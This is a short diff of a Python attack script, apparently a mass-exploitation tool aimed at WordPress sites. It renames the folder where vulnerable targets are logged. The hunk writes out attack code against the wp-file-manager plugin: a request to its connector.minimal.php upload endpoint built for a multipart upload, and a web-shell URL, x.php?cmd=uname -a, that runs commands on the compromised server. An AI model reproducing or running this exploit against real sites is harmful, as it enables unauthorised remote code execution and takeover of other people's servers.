@@ -43,7 +43,7 @@ def exploit(i):
  try:
   if wp(i):
    print("\033[93m" + i + " ==> Wordpress  ")
-   open('0xtn-exp/wordpress.txt', 'a').write(i + '\n')
+   open('AronTn-exp/wordpress.txt', 'a').write(i + '\n')
    shell = i + "/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=uname -a"
    burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" % i
    burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050", "Expect": "100-continue", "Connection": "close"}
